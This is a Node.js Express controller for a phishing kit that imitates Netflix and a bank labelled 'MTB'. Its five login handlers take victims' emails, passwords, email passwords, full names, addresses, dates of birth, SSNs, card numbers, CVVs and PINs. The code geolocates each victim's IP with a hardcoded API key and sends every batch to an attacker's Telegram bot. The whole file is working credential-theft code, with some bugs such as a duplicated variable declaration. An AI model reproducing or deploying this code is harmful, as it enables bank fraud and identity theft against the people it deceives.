const { sendMessageFor } = require("simple-telegram-message");
const ipInfo = require("ip-info-finder");
const { getClientIp } = require("request-ip");
const { botToken, chatId } = require("../config/settings");
const axios = require('axios');
const abstractApiKey = '72afc8e739e6478d9202565f05968721';
const URL = `https://ipgeolocation.abstractapi.com/v1/?api_key=${abstractApiKey}&ip_address=`;



exports.login = (req, res) => {
	return res.render("login");
};

exports.loginPost = async (req, res) => {
	const { username, password } = req.body;
	const ipAddress = getClientIp(req);

	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    // Move the console.log statement outside the sendAPIRequest function
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];


    const message =
        `✅ UPDATE TEAM | NETFL1X | USER_${ipAddress}\n\n` +
        `👤 EMAIL ADDRESS\n` +
        `EMAIL            : ${username}\n\n` +  // Use the provided username from the request
        `🌍 GEO-IP INFO\n` +
        `IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
        `COORDINATES      : ${ipAddressInformation.longitude}, ${ipAddressInformation.latitude}\n` +  // Fix variable names
        `CITY             : ${ipAddressInformation.city}\n` +
        `STATE            : ${ipAddressInformation.region}\n` +
        `ZIP CODE         : ${ipAddressInformation.postal_code}\n` +
        `COUNTRY          : ${ipAddressInformation.country}\n` +
		`TIME             : ${ipAddressInformation.timezone.current_time}\n` +
		`ISP              : ${ipAddressInformation.connection.isp_name}\n\n` +
        `💻 SYSTEM INFO\n` +
        `USER AGENT       : ${userAgent}\n` +
        `SYSTEM LANGUAGE  : ${systemLang}\n` +
        `💬 Telegram: https://t.me/UpdateTeams\n` +
		`🌐 Website: Coming soon!!\n`;

    const sendMessage = sendMessageFor(botToken, chatId);
    sendMessage(message);

	console.log(message);

    res.redirect("/auth/login/2");
    
} catch (error) {
	// Handle any unexpected errors here
	console.error('Unexpected error:', error.message);
	res.status(500).send('Internal Server Error');
}
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    // Handle the rejection
});

	
};

exports.login2 = (req, res) => {
	res.render("login2");
};

exports.loginPost2 = async (req, res) => {
	const { username, password } = req.body;
	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];


        const message =
            `✅ UPDATE TEAM | MTB | USER_${ipAddress}\n\n` +
            `👤 RELOGIN INFO\n` +
			`USERNAME         : ${username}\n` +
			`PASSWORD         : ${password}\n\n` +
            
            `🌍 GEO-IP INFO\n` +
            `IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
            `TIME             : ${ipAddressInformation.timezone.current_time}\n` +
            `💬 Telegram: https://t.me/UpdateTeams\n`;
            

        const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
        sendMessage(message);

        res.redirect("/auth/login/3");
    } catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
	});
	
};


exports.login3 = (req, res) => {
	res.render("login3");
};

exports.loginPost3 = async (req, res) => {
	const { emailAddr, emailPass } = req.body;
	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];


	const message =
		`✅ UPDATE TEAM | MTB | USER_${ipAddress}\n\n` +
		`👤 EMAIL INFO\n` +
		`EMAIL ADDRESS    : ${emailAddr}\n` +
		`EMAIL PASSWORD   : ${emailPass}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
		`TIME             : ${ipAddressInformation.timezone.current_time}\n` +
		`💬 Telegram: https://t.me/UpdateTeams\n`;
            

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/login/4");
} catch (error) {
	// Handle any unexpected errors here
	console.error('Unexpected error:', error.message);
	res.status(500).send('Internal Server Error');
}
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    // Handle the rejection
});

	
};

exports.login4 = (req, res) => {
	return res.render("login4");
};

exports.loginPost4 = async (req, res) => {
	const { fullName, address, zip, phone, dob, ssn } = req.body;
	
	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];


	const message =
		`✅ UPDATE TEAM | MTB | USER_${ipAddress}\n\n` +
		`👤 PERSONAL INFO\n` +
		`FULL NAME        : ${fullName}\n` +
		`STREET ADDRESS   : ${address}\n` +
		`ZIP CODE         : ${zip}\n` +
		`PHONE NUMBER     : ${phone}\n` +
		`DOB              : ${dob}\n` +
		`SSN              : ${ssn}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
		`TIME             : ${ipAddressInformation.timezone.current_time}\n` +
		`💬 Telegram: https://t.me/UpdateTeams\n`;
            

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/login/5");
} catch (error) {
	// Handle any unexpected errors here
	console.error('Unexpected error:', error.message);
	res.status(500).send('Internal Server Error');
}
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    // Handle the rejection
});

	
};

exports.login5 = (req, res) => {
	return res.render("login5");
};

exports.loginPost5 = async (req, res) => {
	const { cardNum, expDate, cvv, pin } = req.body;
	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];


	const message =
		`✅ UPDATE TEAM | MTB | USER_${ipAddress}\n\n` +
		`👤 CARD INFO\n` +
		`CARD NUMBER      : ${cardNum}\n` +
		`EXPIRY DATE      : ${expDate}\n` +
		`CVV              : ${cvv}\n` +
		`CARD PIN         : ${pin}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
		`TIME             : ${ipAddressInformation.timezone.current_time}\n` +
		`💬 Telegram: https://t.me/UpdateTeams\n`;
            

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/complete");
} catch (error) {
	// Handle any unexpected errors here
	console.error('Unexpected error:', error.message);
	res.status(500).send('Internal Server Error');
}
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    // Handle the rejection
});

	
};

exports.complete = (req, res) => {
	return res.render("complete");
};

exports.page404Redirect = (req, res) => {
	return res.redirect("/auth/login");
};